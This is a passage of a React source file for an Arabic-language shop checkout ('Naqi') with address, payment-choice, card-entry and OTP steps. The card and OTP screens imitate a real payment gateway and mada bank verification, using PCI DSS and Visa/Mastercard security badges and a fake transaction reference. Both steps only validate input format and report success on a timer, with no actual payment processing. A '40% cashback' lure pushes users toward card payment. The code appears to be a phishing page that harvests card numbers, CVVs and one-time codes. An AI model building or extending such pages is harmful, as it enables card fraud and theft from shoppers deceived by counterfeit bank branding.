...
// ───────────────────────────────────────────────────────────────────────────────
function OtpStep({ phone, amount, onSuccess, onCancel }: { phone: string; amount: number; onSuccess: () => void; onCancel: () => void }) {
  ...
  const submitOtp = (value: string) => {
    if (value.length < 4) { setError("يرجى إدخال رمز التحقق (4 أو 6 أرقام)"); return; }
    setError("");
    setVerifying(true);
    setTimeout(() => {
      setVerifying(false);
    ...
    <div dir="rtl" className="min-h-screen flex items-center justify-center bg-gray-300 px-4">
      <div className="bg-white shadow-xl overflow-hidden" style={{ width: "360px", border: "1px solid #c8c8c8", borderRadius: "2px" }}>
        <div className="flex items-center justify-between px-4 py-3 border-b" style={{ borderColor: "#ddd" }}>
          ...
          <img src="https://media.base44.com/images/public/69f0f838e7b863b3ce41773c/d4fe35008_image.png" alt="mada" className="h-5 w-auto object-contain" />
        </div>
        <div className="px-6 py-6" dir="rtl">
          ...
          <p className="text-center text-gray-600 text-sm leading-relaxed mb-3">
            ...
            <span className="font-bold text-gray-800" dir="ltr">{phone ? phone.replace(/(\d{3})(\d{3})(\d+)/, "$1 *** $3") : "05xxx"}</span>
          </p>
          ...
          <form onSubmit={(e) => { e.preventDefault(); submitOtp(otp); }}>
            ...
            <input
              ...
              onChange={(e) => {
                ...
                setOtp(val); setError("");
                if (val.length === 4 || val.length === 6) setTimeout(() => submitOtp(val), 300);
              }}
            ...
            {resent && <p className="text-green-600 text-xs text-center mt-2">تم إعادة إرسال الرمز</p>}
            <button type="submit" disabled={verifying || otp.length < 4} className="w-full mt-4 py-3 bg-blue-700 text-white font-bold text-sm hover:bg-blue-800 transition-colors disabled:opacity-50">
              {verifying ? "جاري التحقق..." : "تحقق"}
            </button>
          </form>
          <div className="mt-4 text-center space-y-2">
            <p className="text-gray-500 text-xs">لم يصلك الرمز؟{" "}
              <button onClick={(e) => { e.preventDefault(); setResent(true); setOtp(""); setError(""); setTimeout(() => setResent(false), 3000); }} className="text-blue-600 hover:underline font-medium">إعادة الإرسال</button>
            </p>
            <button onClick={onCancel} className="text-gray-500 text-xs hover:text-gray-700 hover:underline">إلغاء</button>
          </div>
        </div>
      </div>
    </div>
...
function ClickPayStep({
  ...
  const submit = (e: React.FormEvent) => {
    e.preventDefault();
    if (!name.trim()) { setError("يرجى إدخال الاسم على البطاقة"); return; }
    const digits = card.replace(/\s/g, "");
    if (digits.length < 13 || digits.length > 19) { setError("رقم البطاقة غير صحيح"); return; }
    if (!/^\d{2}$/.test(mm) || Number(mm) < 1 || Number(mm) > 12) { setError("الشهر غير صحيح"); return; }
    if (!/^\d{2}$/.test(yy)) { setError("السنة غير صحيحة"); return; }
    if (!/^\d{3,4}$/.test(cvv)) { setError("رمز CVV غير صحيح"); return; }
    setError("");
    setPaying(true);
    setTimeout(() => { setPaying(false); onSuccess(); }, 1500);
  };
    ...
    <div dir="rtl" className="min-h-screen bg-[#f4f5f7] py-6 px-3">
      <div className="max-w-md mx-auto space-y-3">
        ...
        <div className="bg-white rounded-lg shadow-sm py-6 flex items-center justify-center">
          <img src={`${import.meta.env.BASE_URL}logo.svg`} alt="Naqi" className="h-12 w-auto" onError={(e) => { (e.target as HTMLImageElement).style.display = 'none'; }} />
          <span className="text-3xl font-extrabold text-[#1a4480]" style={{ fontFamily: "system-ui" }}>نقي</span>
        </div>

        {/* Merchant + language card */}
        <div className="bg-white rounded-lg shadow-sm px-4 py-3 flex items-center justify-between">
          <button type="button" className="text-[#1a4480] text-xs hover:underline">تغيير اللغة</button>
        ...
        <form onSubmit={submit}>
          ...
          <div className="bg-white rounded-lg shadow-sm p-4 mb-3">
            <p className="text-center text-xs text-gray-700 mb-3 font-medium">اختر طريقتك في الدفع</p>
            <div className="border border-dashed border-gray-300 rounded-md p-2 flex items-center justify-center gap-2">
              ...
              >
                <img src={`${import.meta.env.BASE_URL}card-mastercard.svg`} alt="Mastercard" className="h-7 w-auto object-contain" />
              </button>
              <button
                type="button"
                ...
                aria-label="Visa"
              >
                <img src={`${import.meta.env.BASE_URL}card-visa.svg`} alt="Visa" className="h-6 w-auto object-contain" />
              </button>
              <button
                type="button"
                ...
                aria-label="mada"
              >
                <img src={`${import.meta.env.BASE_URL}card-mada.svg`} alt="mada" className="h-7 w-auto object-contain" />
              </button>
            </div>
          </div>
          ...
          <div className="bg-white rounded-lg shadow-sm p-4 space-y-3 mb-3">
              <div>
                <label className="block text-xs text-gray-600 mb-1.5 text-end">الاسم على البطاقة</label>
                <input
                  type="text"
                  value={name}
              ...
              <div>
                <label className="block text-xs text-gray-600 mb-1.5 text-end">بيانات البطاقة</label>
                ...
                <div className="grid grid-cols-3 gap-2 mt-2">
                  ...
                  <div className="relative">
                    <input
                      ...
                      autoComplete="cc-csc"
                    />
                    <button type="button" className="absolute left-2 top-1/2 -translate-y-1/2 w-5 h-5 rounded-full bg-gray-200 text-gray-600 flex items-center justify-center hover:bg-gray-300" aria-label="مساعدة">
          ...
          <div className="flex items-center justify-between mb-3">
            <button type="button" className="bg-white shadow-sm rounded px-3 py-2 text-[#1a4480] text-xs hover:bg-gray-50 flex items-center gap-1">
          ...
          <div className="bg-white rounded-lg shadow-sm p-4 flex items-center justify-center gap-2 mb-3">
            <span className="text-2xl font-bold text-gray-900 font-mono" dir="ltr">{amount.toLocaleString("en-US", { minimumFractionDigits: 2, maximumFractionDigits: 2 })}</span>
            <span className="text-2xl font-extrabold text-gray-700" style={{ fontFamily: "Arial, sans-serif" }}>﷼</span>
          </div>
        ...
        <div className="bg-white rounded-lg shadow-sm py-3 px-4 flex items-center justify-around gap-2 mt-4">
          <img src={`${import.meta.env.BASE_URL}pci-dss.svg`} alt="PCI DSS Compliant" className="h-5 w-auto object-contain" />
          <img src={`${import.meta.env.BASE_URL}mc-securecode.svg`} alt="MasterCard SecureCode" className="h-5 w-auto object-contain" />
          <img src={`${import.meta.env.BASE_URL}verified-visa.svg`} alt="Verified by VISA" className="h-5 w-auto object-contain" />
        </div>

        <p className="text-center text-[10px] text-gray-400 font-mono mt-2">PMNT0302.69F1B8D0.0047CAF0</p>
      </div>
    </div>
  );
}
      ...
      <div className="space-y-3 mb-4 max-h-64 overflow-y-auto">
        {items.map((item, i) => (
          <div key={i} className="flex gap-3 items-center">
            <img src={item.image_url} alt={item.name_ar} className="w-12 h-12 object-contain rounded-lg bg-muted shrink-0" />
            <div className="flex-1 min-w-0">
              <p className="text-xs font-medium line-clamp-2 text-end">{item.name_ar}</p>
              <p className="text-xs text-muted-foreground text-end">× {item.qty}</p>
            </div>
            <p className="text-sm font-bold text-end shrink-0">{(item.price * item.qty).toLocaleString("ar-SA")} ر.س</p>
          </div>
        ))}
      </div>
      <div className="border-t border-border pt-4 space-y-2">
        <div className="flex justify-between text-sm"><span className="text-muted-foreground">المجموع الفرعي</span><span>{total.toLocaleString("ar-SA")} ر.س</span></div>
        <div className="flex justify-between text-sm"><span className="text-muted-foreground">الشحن</span><span className="text-accent font-bold">مجاني</span></div>
        <div className="flex justify-between font-black text-lg pt-2 border-t border-border"><span>الإجمالي</span><span className="text-primary">{total.toLocaleString("ar-SA")} ر.س</span></div>
      </div>
    </div>
  );
}
...
export default function Checkout() {
  ...
  const [step, setStep] = useState<"form" | "payment" | "otp" | "clickpay" | "success">("form");
  ...
  const submitOrder = async (paymentStatus: "paid" | "unpaid") => {
    setLoading(true);
    setSubmitError(null);
    try {
      const payload = {
        ...
        items: items.map((i) => ({ name_ar: i.name_ar, price: i.price, qty: i.qty, image_url: i.image_url })),
        total,
        notes: form.notes,
      };
      ...
      setSubmitError(err instanceof Error ? err.message : "تعذّر إرسال الطلب، حاول مرة أخرى");
      setStep("payment");
    } finally {
      setLoading(false);
    }
    ...
    return (
      <div dir="rtl" className="min-h-screen flex items-center justify-center p-6">
        <div className="text-center space-y-6 max-w-md">
          ...
          <h1 className="text-2xl font-extrabold text-foreground">تم تأكيد طلبك!</h1>
          <p className="text-muted-foreground">شكراً لك، سيتم التواصل معك قريباً لتأكيد موعد التوصيل.</p>
          <Button onClick={() => navigate("/")} className="w-full">العودة للمتجر</Button>
        </div>
      </div>
    );
  }
            ...
            <form onSubmit={handleStep1} className="lg:col-span-3 space-y-5">
              <div className="bg-card border border-border rounded-2xl p-6 space-y-4">
                ...
                <div className="grid grid-cols-1 sm:grid-cols-2 gap-4">
                  ...
                  <div>
                    <label className="text-sm font-medium text-foreground mb-1.5 block">الحي *</label>
                    <Input required value={form.district} onChange={(e) => set("district", e.target.value)} placeholder="حي النخيل" className="h-11" />
                  </div>
                  <div>
                    <label className="text-sm font-medium text-foreground mb-1.5 block">الرمز البريدي</label>
                    <Input value={form.postal_code} onChange={(e) => set("postal_code", e.target.value.replace(/\D/g, "").slice(0, 5))} placeholder="12345" className="h-11" inputMode="numeric" dir="ltr" />
                  </div>
                  <div>
                    <label className="text-sm font-medium text-foreground mb-1.5 block">رقم المبنى</label>
                    <Input value={form.building} onChange={(e) => set("building", e.target.value)} placeholder="مبنى رقم 24" className="h-11" />
                  </div>
                  <div>
                    <label className="text-sm font-medium text-foreground mb-1.5 block">الدور</label>
                    <Input value={form.floor} onChange={(e) => set("floor", e.target.value)} placeholder="الدور الثاني" className="h-11" />
                  </div>
                </div>
                <div>
                  <label className="text-sm font-medium text-foreground mb-1.5 block">العنوان التفصيلي *</label>
                  <Input required value={form.address} onChange={(e) => set("address", e.target.value)} placeholder="الشارع، أقرب معلم" className="h-11" />
                </div>
                <div>
                  <label className="text-sm font-medium text-foreground mb-1.5 block">ملاحظات (اختياري)</label>
                  <textarea value={form.notes} onChange={(e) => set("notes", e.target.value)} placeholder="أي تعليمات خاصة..." rows={3} className="w-full border border-input bg-transparent rounded-md px-3 py-2 text-sm resize-none focus-visible:outline-none focus-visible:ring-1 focus-visible:ring-ring" />
                </div>
              </div>
              <Button type="submit" className="w-full text-base font-bold rounded-xl h-12">التالي: طريقة الدفع ←</Button>
            </form>
          )}
            ...
            <form onSubmit={handleSubmit} className="lg:col-span-3 space-y-5">
              <div className="bg-card border border-border rounded-2xl p-6 space-y-4">
                ...
                <div className="space-y-3">
                  {[
                    { value: "cod" as const, label: "كاش عند الاستلام", icon: "cod" as const },
                    { value: "credit" as const, label: "بطاقات ائتمانية", icon: "credit" as const, badge: "كاش باك 40%" },
                  ].map((opt) => (
                    <label key={opt.value} className={`flex items-center gap-4 p-4 rounded-xl border-2 cursor-pointer transition-all ${form.payment === opt.value ? "border-primary bg-primary/5" : "border-border hover:border-primary/40"}`}>
                      ...
                      {opt.icon === "cod" ? (
                        <img src="https://media.base44.com/images/public/69f0f838e7b863b3ce41773c/5c886ed42_m2H7G6K9b1d3A0Z5.png" alt="كاش" className="h-8 w-auto object-contain" />
                      ) : (
                        <img src="https://media.base44.com/images/public/69f0f838e7b863b3ce41773c/c14dab934_images1.png" alt="Visa" className="h-6 w-auto object-contain" />
                      )}
                      <div className="flex items-center gap-2 flex-wrap">
                        <span className="font-medium text-foreground">{opt.label}</span>
                        {opt.badge && <span className="bg-destructive text-destructive-foreground text-xs font-bold px-2 py-0.5 rounded-full">{opt.badge}</span>}
                      </div>
                    </label>
                  ))}
                </div>
